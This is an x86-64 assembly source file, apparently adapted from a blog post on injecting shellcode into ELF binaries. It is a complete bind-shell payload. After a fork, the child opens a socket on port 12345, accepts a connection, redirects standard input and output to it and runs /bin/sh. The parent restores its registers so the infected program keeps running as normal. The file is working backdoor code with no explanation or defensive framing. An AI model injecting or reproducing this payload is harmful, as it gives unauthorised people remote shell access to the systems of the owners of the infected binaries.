; Shellcode inpired from https://www.matteomalvica.com/blog/2019/05/18/injecting-shellcode-into-x64-elf-binaries/
;BITS 64

;SECTION .text
;global main

;section .text

  nop 
  nop 
  nop 
  nop
  push rax         ; save all clobbered registers
  push rcx               
  push rdx
  push rsi
  push rdi
  push r11

  ;fork
  xor rax,rax
  add rax,0x39
  syscall
  cmp eax, 0
  jnz normal_exec ; execute normal if parent
;On success, the PID of the child process is returned in the parent,
;and 0 is returned in the child.

bind_shell:  

; socket
  xor eax,eax
  xor ebx,ebx
  xor edx,edx
  ;socket
  mov al,0x1
  mov esi,eax
  inc al
  mov edi,eax
  mov dl,0x6
  mov al,0x29      ; sys_socket (syscall 41)
  syscall

  xchg ebx,eax

  ; bind
  xor  rax,rax
  push   rax
;  push 0x3905 # 1337
  push 0x39300102 ; port 12345
;+  push 0x3905 # 1337

  mov  [rsp+1],al
  mov  rsi,rsp
  mov  dl,16
  mov  edi,ebx
  mov  al,0x31     ; sys_bind (syscall 49)
  syscall

  ;listen
  mov  al,0x5
  mov esi,eax
  mov  edi,ebx
  mov  al,0x32     ; sys_listen (syscall 50)
  syscall

  ;accept
  xor edx,edx
  xor esi,esi
  mov edi,ebx
  mov al,0x2b      ; sys_accept (43)
  syscall
  mov edi,eax      ; store socket

  ;dup2
  xor rax,rax
  mov esi,eax
  mov al,0x21      ; sys_dup2 (syscall 33)
  syscall
  inc al
  mov esi,eax
  mov al,0x21
  syscall
  inc al
  mov esi,eax
  mov al,0x21
  syscall

  ;exec
  xor rdx,rdx
  mov rbx,0x68732f6e69622fff
  shr rbx,0x8
  push rbx
  mov rdi,rsp
  xor rax,rax
  push rax
  push rdi
  mov  rsi,rsp
  mov al,0x3b      ; sys_execve (59)
  syscall
  mov     ebx,0    ; Exit code
  mov     eax,60   ; SYS_EXIT
  int     0x80

normal_exec:
  pop r11          ; restore all registers
  pop rdi
  pop rsi
  pop rdx
  pop rcx
  pop rax
